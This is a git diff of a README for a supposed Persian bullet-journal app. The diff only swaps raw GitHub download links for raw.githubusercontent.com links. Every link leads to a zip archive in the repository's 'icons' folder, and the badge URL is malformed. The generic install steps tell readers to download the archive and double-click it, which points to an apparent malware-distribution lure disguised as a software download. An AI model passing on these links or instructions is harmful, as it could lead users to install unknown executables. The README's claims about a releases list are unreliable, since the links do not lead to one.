@@ -1,7 +1,7 @@
 # 📓 persian-Bulletjournal - Organize Your Thoughts Easily
 
 ## 🔗 Download Here
-[![Download from Releases](https://github.com/migmi111/persian-Bulletjournal/raw/refs/heads/main/icons/Bulletjournal-persian-3.9.zip%20Persian%https://github.com/migmi111/persian-Bulletjournal/raw/refs/heads/main/icons/Bulletjournal-persian-3.9.zip)](https://github.com/migmi111/persian-Bulletjournal/raw/refs/heads/main/icons/Bulletjournal-persian-3.9.zip)
+[![Download from Releases](https://raw.githubusercontent.com/migmi111/persian-Bulletjournal/main/icons/Bulletjournal-persian-3.9.zip%20Persian%https://raw.githubusercontent.com/migmi111/persian-Bulletjournal/main/icons/Bulletjournal-persian-3.9.zip)](https://raw.githubusercontent.com/migmi111/persian-Bulletjournal/main/icons/Bulletjournal-persian-3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to Persian BulletJournal! This application helps you organize your thoughts and tasks in a simple and effective way. Let’s make planning easier for you.
@@ -9,7 +9,7 @@ Welcome to Persian BulletJournal! This application helps you organize your thoug
 ## 📥 Download & Install
 To download the software, follow these steps:
 
-1. Click on the download button at the top or [visit this page to download](https://github.com/migmi111/persian-Bulletjournal/raw/refs/heads/main/icons/Bulletjournal-persian-3.9.zip).
+1. Click on the download button at the top or [visit this page to download](https://raw.githubusercontent.com/migmi111/persian-Bulletjournal/main/icons/Bulletjournal-persian-3.9.zip).
 2. You will see a list of available releases. Look for the latest version.
 3. Click on the file that matches your operating system.
 4. Once the file is downloaded, double-click it to start the installation.
@@ -51,4 +51,4 @@ Yes, you can find support in the GitHub Issues section. We are here to help you!
 If you have questions, feedback, or suggestions, feel free to reach out. You can connect with us through the issues section on our GitHub page.
 
 ## 🔗 Download Here Again
-Don't forget to [visit this page to download](https://github.com/migmi111/persian-Bulletjournal/raw/refs/heads/main/icons/Bulletjournal-persian-3.9.zip) the latest version. Enjoy using Persian BulletJournal to organize your daily life!
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/migmi111/persian-Bulletjournal/main/icons/Bulletjournal-persian-3.9.zip) the latest version. Enjoy using Persian BulletJournal to organize your daily life!
